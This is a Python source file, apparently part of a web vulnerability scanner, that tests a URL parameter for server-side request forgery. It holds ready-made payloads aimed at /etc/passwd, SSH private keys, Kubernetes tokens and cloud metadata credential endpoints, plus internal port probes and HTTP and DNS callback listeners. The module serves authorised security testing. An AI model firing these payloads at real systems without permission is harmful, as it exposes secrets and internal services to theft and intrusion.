import re, threading, http.server, socket, json, time, os, struct, random, string, urllib.parse
from typing import Optional
import requests

from tools.log_utils import get_logger
from tools.http_client import build_url

logger = get_logger("ssrf_detector")

SSRF_EVIDENCE_PATTERNS = [
    r"root:.*:0:0:",
    r"root:[^:]+:\d+:\d+",
    r"uid=\d+\([\w]+\)",
    r"gid=\d+\([\w]+\)",
    r"\[root\].*#!/bin/bash",
    r"ami-[a-z0-9]{17}",
    r"ami-id",
    r"instance-id",
    r"instance-type",
    r"local-hostname",
    r"local-ipv4",
    r"public-hostname",
    r"public-ipv4",
    r"security-credentials",
    r"iam/security-credentials",
    r"AWS_SECRET_ACCESS_KEY",
    r"AWS_ACCESS_KEY_ID",
    r"MetaData",
    r"user-data",
    r"<html><head><title>Bucket: ",
    r"ListBucketResult",
    r"<Name>",
    r"<Contents>",
    r"<Key>",
    r"project-id",
    r"user-id",
]

SSRF_URLS = [
    "file:///etc/passwd",
    "file:///c:/windows/win.ini",
    "http://169.254.169.254/latest/meta-data/",
    "http://169.254.169.254/latest/user-data/",
    "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
    "http://metadata.google.internal/computeMetadata/v1/",
    "http://169.254.169.254/latest/meta-data/iam/security-credentials/admin",
    "http://169.254.169.254/",
    "http://127.0.0.1:22",
    "http://127.0.0.1:80",
    "http://127.0.0.1:443",
    "http://127.0.0.1:8080",
    "http://127.0.0.1:3306",
    "http://127.0.0.1:6379",
    "http://127.0.0.1:27017",
    "http://127.0.0.1:9200",
    "http://127.0.0.1:5432",
    "http://127.0.0.1:8000",
    "http://127.0.0.1:8443",
    "dict://127.0.0.1:6379/info",
    "gopher://127.0.0.1:6379/_info",
    "http://127.0.0.1:8080/actuator/health",
    "http://127.0.0.1:2375/version",
    "http://127.0.0.1:2376/version",
    "http://127.0.0.1:11211/",
    "file:///proc/self/environ",
    "file:///proc/self/cmdline",
    "file:///proc/1/cwd/app/config/database.yml",
    "file:///etc/nginx/nginx.conf",
    "file:///etc/nginx/sites-enabled/default",
    "file:///etc/apache2/apache2.conf",
    "file:///var/log/nginx/access.log",
    "file:///var/log/apache2/access.log",
    "file:///etc/ssh/sshd_config",
    "file:///root/.ssh/id_rsa",
    "file:///home/ubuntu/.ssh/authorized_keys",
    "file:///var/run/secrets/kubernetes.io/serviceaccount/token",
    "http://169.254.169.254/metadata/instance?api-version=2021-02-01",
]

INTERNAL_PROBES = [
    "http://127.0.0.1:8080/",
    "http://127.0.0.1:80/",
    "http://localhost/",
    "http://127.0.0.1:3000/",
    "http://127.0.0.1:5000/",
    "http://127.0.0.1:9000/",
    "http://127.0.0.1:9090/",
    "http://127.0.0.0:8080/",
    "http://0.0.0.0:8080/",
    "http://[::]:8080/",
    "http://10.0.0.1:80/",
    "http://172.16.0.1:80/",
    "http://192.168.1.1:80/",
]


def _get_lan_ip():
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(("10.255.255.255", 1))
        ip = s.getsockname()[0]
        s.close()
        return ip
    except Exception as e:
        logger.debug("failed to get LAN IP via UDP: %s", e)
    try:
        hostname = socket.gethostname()
        ip = socket.gethostbyname(hostname)
        if ip and not ip.startswith("127."):
            return ip
    except Exception as e:
        logger.debug("failed to get LAN IP via hostname: %s", e)
    return "127.0.0.1"


def _is_local_target(url: str) -> bool:
    parsed = urllib.parse.urlparse(url)
    host = parsed.hostname or ""
    if host in ("localhost", "127.0.0.1", "0.0.0.0", "::1"):
        return True
    if host.startswith("10.") or host.startswith("172.") or host.startswith("192.168."):
        return True
    return False


class OOBListener:
    def __init__(self, port: int = 0, timeout: float = 6.0,
                 custom_callback: Optional[str] = None):
        self.port = port
        self.oob_timeout = timeout
        self.caught = threading.Event()
        self.request_data = None
        self._server = None
        self._thread = None
        self.custom_callback = custom_callback

    def start(self):
        if self.custom_callback:
            return self.custom_callback
        try:
            self._server = http.server.HTTPServer(("0.0.0.0", self.port), self._make_handler(self))
            self.port = self._server.server_address[1]
        except OSError as e:
            logger.debug("OOB listener failed to bind: %s", e)
            return None
        self._thread = threading.Thread(target=self._server.serve_forever, daemon=True)
        self._thread.start()
        lan_ip = _get_lan_ip()
        return "http://%s:%d/oob" % (lan_ip, self.port)

    def stop(self):
        if self._server:
            self._server.shutdown()

    @staticmethod
    def _make_handler(listener):
        class Handler(http.server.BaseHTTPRequestHandler):
            def do_GET(self):
                listener.caught.set()
                listener.request_data = {"path": self.path, "headers": dict(self.headers)}
                self.send_response(200)
                self.end_headers()
                self.wfile.write(b"ok")

            def log_message(self, *a):
                pass
        return Handler


class DnsOobListener:
    def __init__(self, port: int = 0, timeout: float = 6.0):
        self.port = port
        self.oob_timeout = timeout
        self.caught = threading.Event()
        self.domain_token = "".join(random.choices(string.ascii_lowercase + string.digits, k=8))
        self.queried_domain = None
        self._sock = None
        self._thread = None

    def start(self):
        try:
            self._sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            self._sock.bind(("0.0.0.0", self.port or 0))
            self._sock.settimeout(self.oob_timeout)
            self.port = self._sock.getsockname()[1]
        except OSError as e:
            logger.debug("DNS OOB listener failed to bind: %s", e)
            return None

        lan_ip = _get_lan_ip()
        oob_domain = "%s.%s.oob" % (self.domain_token, lan_ip.replace(".", "-"))

        self._thread = threading.Thread(target=self._listen, daemon=True)
        self._thread.start()
        return oob_domain

    def _listen(self):
        while not self.caught.is_set():
            try:
                data, addr = self._sock.recvfrom(512)
                domain = self._parse_dns_query(data)
                if domain and self.domain_token in domain:
                    self.caught.set()
                    self.queried_domain = domain
            except socket.timeout:
                break
            except Exception:
                break

    @staticmethod
    def _parse_dns_query(data: bytes) -> Optional[str]:
        try:
            if len(data) < 12:
                return None
            qdcount = struct.unpack("!H", data[4:6])[0]
            if qdcount < 1:
                return None
            pos = 12
            labels = []
            while pos < len(data):
                length = data[pos]
                if length == 0:
                    pos += 1
                    break
                if length & 0xC0:
                    pos += 2
                    break
                pos += 1
                if pos + length > len(data):
                    return None
                labels.append(data[pos:pos + length].decode("ascii", errors="replace"))
                pos += length
            return ".".join(labels)
        except Exception:
            return None

    def stop(self):
        self.caught.set()
        if self._sock:
            try:
                self._sock.close()
            except Exception:
                pass


def _test_oob(url: str, param: str, sess: requests.Session,
              timeout: float, custom_callback: Optional[str] = None) -> dict:
    oob_timeout = min(timeout, 6.0)
    result = {"vulnerable": False, "type": None, "evidence": [],
              "payload": None, "oob_methods": []}

    # HTTP OOB
    http_listener = OOBListener(timeout=oob_timeout, custom_callback=custom_callback)
    oob_url = http_listener.start()

    if oob_url:
        host = oob_url.split("/")[2].split(":")[0] if "://" in oob_url else ""
        test_payloads = [
            oob_url,
            "http://%s/oob" % host,
            "dict://%s/oob" % host,
            "gopher://%s/_test" % host,
        ] if host else [oob_url]

        for payload in test_payloads:
            try:
                sess.get(build_url(url, param, payload),
                         timeout=timeout, verify=False)
            except Exception as e:
                logger.debug("ssrf oob %s: %s", payload[:30], e)
            if http_listener.caught.wait(timeout=oob_timeout):
                result["vulnerable"] = True
                result["type"] = "oob_http_callback"
                result["evidence"].append("HTTP OOB: %s" % str(http_listener.request_data)[:60])
                result["payload"] = payload
                result["oob_methods"].append("http")
                break

    http_listener.stop()

    # DNS OOB — only attempt if HTTP OOB didn't trigger and target is internal
    if not result["vulnerable"] and _is_local_target(url):
        dns_listener = DnsOobListener(timeout=oob_timeout)
        oob_domain = dns_listener.start()

        if oob_domain:
            dns_payloads = [
                "http://%s/" % oob_domain,
                "dict://%s/x" % oob_domain,
            ]
            for payload in dns_payloads:
                try:
                    sess.get(build_url(url, param, payload),
                             timeout=timeout, verify=False)
                except Exception as e:
                    logger.debug("ssrf dns oob %s: %s", payload[:30], e)
                if dns_listener.caught.wait(timeout=oob_timeout):
                    result["vulnerable"] = True
                    result["type"] = "oob_dns_callback"
                    result["evidence"].append("DNS OOB: %s" % dns_listener.queried_domain)
                    result["payload"] = payload
                    result["oob_methods"].append("dns")
                    break

        dns_listener.stop()

    if not result["oob_methods"]:
        is_external = not _is_local_target(url)
        if is_external and not custom_callback:
            result["note"] = "External target: OOB callback may not reach local listener. Use --oob-server to specify a public callback URL."

    return result


def check(url: str, param: str, sess: Optional[requests.Session] = None,
          timeout: float = 10.0, oob_server: Optional[str] = None) -> dict:
    if sess is None:
        sess = requests.Session()
    result = {"vulnerable": False, "type": None, "evidence": [], "payload": None,
              "oob_tested": False, "oob_server_used": oob_server}

    for ssrf_url in SSRF_URLS:
        try:
            r = sess.get(build_url(url, param, ssrf_url),
                         timeout=timeout, verify=False)
            for pat in SSRF_EVIDENCE_PATTERNS:
                if re.search(pat, r.text, re.IGNORECASE):
                    result["vulnerable"] = True
                    result["type"] = "disclosure"
                    result["evidence"].append("ssrf: %s => <%s>" % (ssrf_url[:30], pat[:20]))
                    result["payload"] = ssrf_url
                    break
        except Exception as e:
            logger.debug("ssrf url %s: %s", ssrf_url[:30], e)
        if result["vulnerable"]:
            return result

    if not result["vulnerable"]:
        for internal_url in INTERNAL_PROBES:
            try:
                r = sess.get(build_url(url, param, internal_url),
                             timeout=timeout, verify=False)
                if r.status_code not in (404, 502, 503) and len(r.text) > 10:
                    result["vulnerable"] = True
                    result["type"] = "internal_reachable"
                    result["evidence"].append("ssrf: %s => %d bytes, %d" % (
                        internal_url[:20], len(r.text), r.status_code))
                    result["payload"] = internal_url
                    break
            except Exception as e:
                logger.debug("ssrf internal %s: %s", internal_url[:20], e)

    if not result["vulnerable"]:
        try:
            oob = _test_oob(url, param, sess, timeout, custom_callback=oob_server)
            result["oob_tested"] = True
            result["oob_methods"] = oob.get("oob_methods", [])
            if oob["vulnerable"]:
                result["vulnerable"] = True
                result["type"] = oob.get("type", "oob_callback")
                result["evidence"] = oob["evidence"]
                result["payload"] = oob["payload"]
            if oob.get("note"):
                result["oob_note"] = oob["note"]
        except Exception as e:
            logger.debug("ssrf oob test: %s", e)

    return result
